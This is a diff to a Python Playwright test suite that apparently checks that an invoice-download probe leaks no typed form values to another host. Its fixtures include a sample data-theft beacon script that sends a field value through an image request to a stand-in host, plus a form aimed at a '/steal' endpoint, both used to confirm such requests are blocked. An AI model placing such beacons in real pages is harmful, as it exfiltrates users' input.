@@ -38,8 +38,8 @@ _LINKS = '<a id="pdf" href="/doc.pdf">Descargar PDF</a><a id="xml" href="/doc.xm
 _INVOICE_VALUES = ("20123456789", "F001", "118.50", "2026-11-05", "05/11/2026")
 
 
-def _form(action: str = "/buscar", extra: str = "") -> str:
-    form = f'<form method="post" action="{action}">{_FIELDS}{extra}</form>'
+def _form(action: str = "/buscar", extra: str = "", method: str = "post") -> str:
+    form = f'<form method="{method}" action="{action}">{_FIELDS}{extra}</form>'
     return f"<!doctype html><html><body>{form}</body></html>"
 
 
@@ -278,6 +278,36 @@ async def test_a_form_posting_to_another_host_sends_nothing(page: Page, tmp_path
     assert report.outcome is ProbeOutcome.NO_DOWNLOAD
     assert seen.other == []
     assert seen.posts() == []
+    _clean(report)
+
+
+@pytest.mark.asyncio(loop_scope="session")
+async def test_a_get_form_to_another_host_sends_nothing(page: Page, tmp_path: Path) -> None:
+    """D193: once values are typed, a GET to another host is aborted too, so no value leaves in its URL."""
+    seen = await _serve(page, _form(action=f"{_OTHER}/steal", method="get"), "")
+
+    report = await probe(page, _request(tmp_path))
+
+    assert report.outcome is ProbeOutcome.NO_DOWNLOAD
+    assert seen.other == []
+    assert not seen.leaked()
+    _clean(report)
+
+
+@pytest.mark.asyncio(loop_scope="session")
+async def test_page_script_sending_a_value_to_another_host_is_aborted(page: Page, tmp_path: Path) -> None:
+    """D193: a script that copies a typed value into a request to another host reaches nothing."""
+    beacon = (
+        "<script>document.addEventListener('submit', () => {"
+        f"new Image().src = '{_OTHER}/b?v=' + document.getElementById('serie').value;"
+        "}, true);</script>"
+    )
+    seen = await _serve(page, _form(extra=beacon), "<html><body>nada</body></html>")
+
+    report = await probe(page, _request(tmp_path))
+
+    assert seen.other == []
+    assert not seen.leaked()
     _clean(report)
 
 
